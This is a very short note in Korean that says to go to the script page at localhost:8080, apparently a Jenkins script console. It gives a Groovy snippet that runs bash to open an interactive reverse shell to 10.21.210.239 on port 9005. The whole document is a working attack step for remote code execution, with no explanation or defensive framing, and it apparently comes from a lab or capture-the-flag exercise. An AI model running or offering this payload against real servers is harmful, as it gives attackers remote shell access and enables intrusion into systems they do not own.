

http://localhost:8080/script 위치에 가서

```
r=Runtime.getRuntime()
p=r.exec(["/bin/bash","-c","sh -i >& /dev/tcp/10.21.210.239/9005 0>&1"] as String[])
p.waitFor()
```

